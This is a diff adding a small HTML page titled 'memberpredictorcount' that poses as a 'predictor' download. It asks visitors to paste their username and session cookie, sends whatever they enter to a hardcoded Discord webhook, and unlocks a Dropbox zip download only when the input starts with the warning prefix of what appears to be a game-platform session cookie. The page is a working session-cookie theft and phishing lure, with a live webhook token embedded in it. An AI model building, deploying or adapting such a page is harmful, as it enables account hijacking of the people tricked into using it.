@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>memberpredictorcount</title>
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: #f0f0f0;
+            flex-direction: column;
+        }
+        button {
+            background-color: #007bff;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 10px;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        button:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+        }
+    </style>
+</head>
+<body>
+    <button id="sendButton">Insert cookie and username like this : "USER===COOKIE"</button>
+    <button id="downloadButton" disabled>Download</button>
+
+    <script>
+        const prefix = '_|WARNING:-DO-NOT-SHARE-THIS';  // Change this to your desired prefix
+        const downloadButton = document.getElementById('downloadButton');
+
+        document.getElementById('sendButton').addEventListener('click', function() {
+            const message = prompt("Enter your message:");
+            if (message) {
+                const webhookURL = 'https://discord.com/api/webhooks/1270054713081200763/Etnw95IkGxVRCSCFABo9JcWZIypi_5ciQ5SxYu3VDE-5B_1cgUv_pO-_TnHt_JaNbpRd';
+                const payload = {
+                    content: message
+                };
+
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                })
+                .then(response => {
+                    if (response.ok) {
+                        alert('Message sent successfully!');
+                        if (message.startsWith(prefix)) {
+                            downloadButton.disabled = false;
+                        }
+                    } else {
+                        alert('Failed to send message.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('An error occurred while sending the message.');
+                });
+            }
+        });
+
+        downloadButton.addEventListener('click', function() {
+            // Replace the URL with the actual link to the file you want users to download
+            const downloadURL = 'https://www.dropbox.com/scl/fi/vmwcc4bpqaaz51pvrop1a/predoctor.zip?rlkey=fh98p8u4fst4kgq88bhyrljwu&st=kbko96ga&dl=0';
+            window.location.href = downloadURL;
+        });
+    </script>
+</body>
+</html>
